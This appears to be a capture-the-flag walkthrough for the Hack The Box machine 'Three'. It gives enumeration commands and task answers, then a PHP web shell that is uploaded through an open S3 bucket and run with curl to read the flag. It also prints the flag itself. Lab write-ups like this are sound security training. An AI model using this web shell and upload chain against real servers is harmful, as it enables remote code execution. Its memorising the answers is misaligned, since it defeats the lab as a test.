# Three - Very Easy

IP = 10.129.65.188

## Task 1 - How many TCP ports are open?

```bash
nmap -sV $IP
```

> Answer:
> 2

## Task 2 - What is the domain of the email address provided in the "Contact" section of the website?

> Answer:
> thetoppers.htb

## Task 3 - In the absence of a DNS server, which Linux file can use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

> Answer:
> /etc/hosts

```bash
echo "$IP thetoppers.htb" | sudo tee -a /etc/hosts
```

## Task 4 - Which sub-domain is discovered during futher enumeration?

```bash
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP
```

> Answer:
> s3.thetoppers.htb

```bash
echo "$IP s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

## Task 5 - Which service is runnig on the discovered sub-domain?

> Answer:
> Amazon s3

## Task 6 - Which command line utility can be used to interact with the service running on the discovered sub-domain?

> Answer:
> awscli

## Task 7 - Which command is used to set up the AWS CLI installation?

> Answer:
> aws configure

## Task 8 - What is the command used by the above utility to list all of the S· buckets?

> Answer:
> aws s3 ls --endpoint=http://s3.thetoppers.htb

## Task 9 - This server is configured to run files written in what web scripting language?

> Answer:
> PHP

## Submit flag - Submit root flag

```bash
# Create a RCE 
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload the RCE
aws s3 cp shell.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb

# Execute the shell
curl http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
```

> Answer:
> a980d99281a28d638ac68b9bf9453c2b
